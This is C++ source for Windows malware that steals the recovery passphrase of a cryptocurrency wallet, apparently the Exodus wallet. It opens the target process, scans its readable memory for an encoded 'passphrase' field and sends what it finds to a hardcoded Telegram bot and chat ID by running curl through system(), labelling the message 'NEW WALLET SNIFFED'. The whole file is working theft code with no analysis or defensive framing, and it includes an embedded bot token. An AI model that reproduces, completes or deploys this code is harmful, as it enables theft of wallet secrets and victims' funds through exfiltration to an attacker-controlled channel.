#include <iostream>
#include <vector>
#include <windows.h>
#include <psapi.h>
#include <iomanip>
#include <tlhelp32.h>
#include <memory>
#include <string>
#include <algorithm>
#include <sstream>
#include <cstdlib>


class StringValidator {
public:
    static bool isValidString(const char* str, size_t maxLen) {
        if (!str || maxLen == 0) return false;
        if (!isValidChar(str[0])) return false;

        size_t length = 0;
        bool hasValidChars = false;

        for (size_t i = 0; i < maxLen && str[i] != '\0'; i++) {
            if (!isValidChar(str[i])) return false;
            hasValidChars = true;
            length++;
            if (length > 2048) return false;
        }

        return hasValidChars;
    }

private:
    static bool isValidChar(char c) {
        unsigned char uc = static_cast<unsigned char>(c);
        return (uc >= 32 && uc <= 126) || (uc >= 128);
    }
};

class MemoryRegionHandler {
public:
    static bool isReadableRegion(const MEMORY_BASIC_INFORMATION& mbi) {
        if (!(mbi.State & MEM_COMMIT)) return false;
        if (mbi.Protect & PAGE_GUARD) return false;
        if (mbi.Protect & PAGE_NOACCESS) return false;

        DWORD readFlags = PAGE_READONLY | PAGE_READWRITE | PAGE_EXECUTE_READ | PAGE_EXECUTE_READWRITE;
        return (mbi.Protect & readFlags) != 0;
    }
};

class ProcessMemoryReader {
public:
    ProcessMemoryReader(const char* processName) : m_processName(processName), m_processHandle(NULL) {}

    bool initialize() {
        DWORD processId = findProcessId();
        if (processId == 0) return false;

        m_processHandle = OpenProcess(PROCESS_QUERY_INFORMATION | PROCESS_VM_READ, FALSE, processId);
        return m_processHandle != NULL;
    }


    void scanForStrings() {
        if (!m_processHandle) return;

        LPVOID address = nullptr;
        MEMORY_BASIC_INFORMATION mbi;

        while (VirtualQueryEx(m_processHandle, address, &mbi, sizeof(mbi))) {
            if (MemoryRegionHandler::isReadableRegion(mbi)) {
                std::string passphrase = scanRegion(mbi);
                if (!passphrase.empty()) {
                    std::cout << "Exodus Phrase: " << passphrase << std::endl;
                    std::string chat_id = "-4798648916";
                    std::string encodedMessage = "**NEW%20WALLET%20SNIFFED**%0APassPhrase%F0%9F%94%92:%20" + passphrase;

                    std::string url = "https://api.telegram.org/bot7704470969:AAGj0U9jr-igLpZIWbihHbw5sIWo_X3nt14/sendMessage"
                        "?chat_id=" + chat_id + "&text=" + encodedMessage + "&parse_mode=MarkdownV2";

                    std::string command = "curl -s \"" + url + "\"";
                    system(command.c_str());


                    m_longStringFound = true;
                    break;
                }
            }
            address = (LPVOID)((DWORD_PTR)mbi.BaseAddress + mbi.RegionSize);
        }

        if (!m_longStringFound) {
            std::cout << "No Phrase Found";
        }
    }

    ~ProcessMemoryReader() {
        if (m_processHandle) {
            CloseHandle(m_processHandle);
        }
    }

private:
    const char* m_processName;
    HANDLE m_processHandle;
    bool m_longStringFound = false;

    DWORD findProcessId() {
        HANDLE snapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
        if (snapshot == INVALID_HANDLE_VALUE) return 0;

        PROCESSENTRY32W processEntry = { sizeof(PROCESSENTRY32W) };
        DWORD processId = 0;

        int bufferSize = MultiByteToWideChar(CP_UTF8, 0, m_processName, -1, NULL, 0);
        std::vector<wchar_t> wideProcessName(bufferSize);
        MultiByteToWideChar(CP_UTF8, 0, m_processName, -1, wideProcessName.data(), bufferSize);

        if (Process32FirstW(snapshot, &processEntry)) {
            do {
                if (_wcsicmp(processEntry.szExeFile, wideProcessName.data()) == 0) {
                    processId = processEntry.th32ProcessID;
                    break;
                }
            } while (Process32NextW(snapshot, &processEntry));
        }

        CloseHandle(snapshot);
        return processId;
    }



    std::string scanRegion(const MEMORY_BASIC_INFORMATION& mbi) {
        std::vector<char> buffer(mbi.RegionSize);
        SIZE_T bytesRead;

        if (ReadProcessMemory(m_processHandle, mbi.BaseAddress, buffer.data(), mbi.RegionSize, &bytesRead)) {
            for (size_t i = 0; i < bytesRead; ++i) {
                if (StringValidator::isValidString(&buffer[i], bytesRead - i)) {
                    std::string str(&buffer[i]);
                    size_t pos = str.find("passphrase%22%3A%22");
                    if (pos != std::string::npos) {
                        size_t start = pos + 19; 
                        size_t end = str.find("%22", start);
                        if (end != std::string::npos) {
                            std::string passphrase = str.substr(start, end - start);
                            return passphrase;
                        }
                    }
                }
            }
        }
        return "";
    }

};
